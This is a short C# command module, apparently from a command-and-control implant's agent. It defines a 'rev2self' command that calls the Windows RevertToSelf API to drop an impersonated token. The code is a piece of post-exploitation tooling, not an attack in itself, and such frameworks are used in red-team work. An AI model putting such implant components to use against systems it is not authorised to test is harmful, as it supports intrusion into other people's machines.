using Agent.Models;

namespace Agent.Commands
{
    public class RevToSelf : AgentCommand
    {
        public override string Name => "rev2self";

        public override string Execute(AgentTask task)
        {
            if (Native.Advapi.RevertToSelf())
            {
                return "Reverted to self";
            }

            return "Failed to revert";
        }
    }
}
